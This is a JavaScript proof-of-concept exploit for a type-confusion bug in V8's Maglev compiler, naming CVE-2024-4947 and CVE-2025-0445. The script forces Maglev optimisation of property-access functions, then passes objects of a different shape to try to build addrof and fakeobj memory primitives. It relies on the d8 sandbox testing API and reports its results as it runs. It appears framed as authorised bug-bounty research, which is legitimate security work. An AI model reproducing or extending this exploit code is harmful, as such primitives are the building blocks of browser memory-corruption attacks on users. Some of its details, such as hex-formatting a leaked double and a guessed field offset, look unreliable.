// =============================================================================
// PoC: Maglev Type Confusion via Optimized Code
// Target: CVE-2024-4947 / CVE-2025-0445
// Technique: Force Maglev compilation with %PrepareFunctionForOptimization()
//   and %OptimizeMaglevOnNextCall(). Create type confusion by passing
//   unexpected object types through optimized paths. The Maglev compiler may
//   generate code that accesses memory based on wrong type assumptions,
//   allowing type confusion -> addrof/fakeobj primitives.
// Runtime: d8 --sandbox-fuzzing --allow-natives-syntax --expose-gc poc.js
// Category: V8 Sandbox Bug Bounty (authorized security research)
// =============================================================================

function require_feature(name, test) {
  if (!test) {
    print("[!] FATAL: required feature missing: " + name);
    quit(1);
  }
}

require_feature("Sandbox API", typeof Sandbox !== "undefined" && typeof Sandbox.MemoryView === "function");
require_feature("Sandbox.getAddressOf", typeof Sandbox.getAddressOf === "function");
require_feature("Sandbox.getSizeOf", typeof Sandbox.getSizeOf === "function");
require_feature("gc()", typeof gc === "function");
require_feature("%PrepareFunctionForOptimization", (() => {
  try { eval("%PrepareFunctionForOptimization(function(){})"); return true; }
  catch(e) { return false; }
})());

// --- Helpers ---
function addrof(obj) { return Sandbox.getAddressOf(obj); }
function sizeof(obj) { return Sandbox.getSizeOf(obj); }

function read64(sbxOffset) {
  const view = new Sandbox.MemoryView(sbxOffset, 8);
  const lo = view[0] | (view[1] << 8) | (view[2] << 16) | (view[3] << 24);
  const hi = view[4] | (view[5] << 8) | (view[6] << 16) | (view[7] << 24);
  return [lo >>> 0, hi >>> 0];
}

function write64(sbxOffset, lo, hi) {
  const view = new Sandbox.MemoryView(sbxOffset, 8);
  view[0] = lo & 0xff;         view[1] = (lo >> 8) & 0xff;
  view[2] = (lo >> 16) & 0xff; view[3] = (lo >> 24) & 0xff;
  view[4] = hi & 0xff;         view[5] = (hi >> 8) & 0xff;
  view[6] = (hi >> 16) & 0xff; view[7] = (hi >> 24) & 0xff;
}

function hex(val) { return "0x" + (val >>> 0).toString(16).padStart(8, "0"); }

// --- Step 1: Create objects with different hidden classes (maps) ---
print("[*] Setting up type confusion target objects...");

// Object shape A: has numeric 'x' property
function ShapeA(x) { this.x = x; }
// Object shape B: has object 'x' property
function ShapeB(x) { this.x = x; }

const objA = new ShapeA(1.1);          // x is Smi/HeapNumber
const objB = new ShapeB({marker: 42}); // x is JSObject

print("[*] ShapeA instance at: " + hex(addrof(objA)) + " size=" + sizeof(objA));
print("[*] ShapeB instance at: " + hex(addrof(objB)) + " size=" + sizeof(objB));

// --- Step 2: Define function that Maglev will optimize for ShapeA ---
function readX(obj) {
  // Maglev will specialize this for the map of ShapeA (numeric x).
  // If we later pass a ShapeB (object x), Maglev-generated code may
  // interpret the object pointer as a double, leaking an address.
  return obj.x;
}

print("[*] Training readX() on ShapeA instances for Maglev...");
%PrepareFunctionForOptimization(readX);

// Warmup: train feedback vector with ShapeA
for (let i = 0; i < 100; i++) {
  readX(new ShapeA(i * 1.1));
}

// Trigger Maglev compilation
%OptimizeMaglevOnNextCall(readX);
const resultA = readX(objA);
print("[*] readX(ShapeA) = " + resultA + " (expected: 1.1)");

// Check optimization status
const optStatus = %GetOptimizationStatus(readX);
print("[*] Optimization status: " + optStatus);
if ((optStatus & 0x20) !== 0) {  // bit 5 = optimized by Maglev
  print("[+] readX is Maglev-optimized.");
} else if ((optStatus & 0x10) !== 0) {
  print("[*] readX is TurboFan-optimized (Maglev may have tiered up).");
} else {
  print("[!] readX is NOT optimized. Type confusion unlikely.");
}

// --- Step 3: Trigger type confusion ---
print("[*] Passing ShapeB (object x) to Maglev-optimized readX()...");

let confusedValue;
try {
  confusedValue = readX(objB);
  print("[*] readX(ShapeB) returned: " + confusedValue);
  print("[*] typeof result: " + typeof confusedValue);

  if (typeof confusedValue === "number" && !isNaN(confusedValue)) {
    // If we got a number back from an object field, type confusion worked.
    // The number is actually the compressed pointer to {marker: 42}.
    print("[+] TYPE CONFUSION! Object pointer leaked as double.");
    print("[+] Leaked compressed pointer: " + hex(confusedValue));
    print("[BYPASS] Maglev type confusion confirmed (CVE-2024-4947 pattern).");
  } else if (typeof confusedValue === "object") {
    print("[!] Got object back - Maglev correctly handled the type transition.");
    print("[!] Type confusion did not occur (map check passed).");
  }
} catch (e) {
  print("[!] Exception during type confusion: " + e.message);
  print("[!] Maglev deoptimized safely.");
}

// --- Step 4: Reverse direction - fakeobj primitive attempt ---
print("[*] Attempting reverse confusion: number interpreted as object...");

function writeX(obj, val) {
  obj.x = val;
}

%PrepareFunctionForOptimization(writeX);
for (let i = 0; i < 100; i++) {
  const tmp = new ShapeB({});
  writeX(tmp, {v: i});
}
%OptimizeMaglevOnNextCall(writeX);
writeX(new ShapeB({}), {v: 999});

// Now pass ShapeA where Maglev expects ShapeB (object field)
const target = new ShapeA(1.1);
const fakeAddr = addrof(target); // Get a known sandbox address

try {
  // If Maglev stores the number directly as a tagged pointer...
  writeX(target, fakeAddr);
  print("[*] writeX(ShapeA, addr) completed.");

  // Read back via MemoryView to see what was stored
  const storedVal = read64(addrof(target) + 0x0c); // x field offset guess
  print("[*] Stored value at x field: " + hex(storedVal[0]) + " " + hex(storedVal[1]));
} catch (e) {
  print("[!] Reverse confusion failed: " + e.message);
}

// --- Cleanup ---
gc();
print("[*] Maglev type confusion PoC completed.");
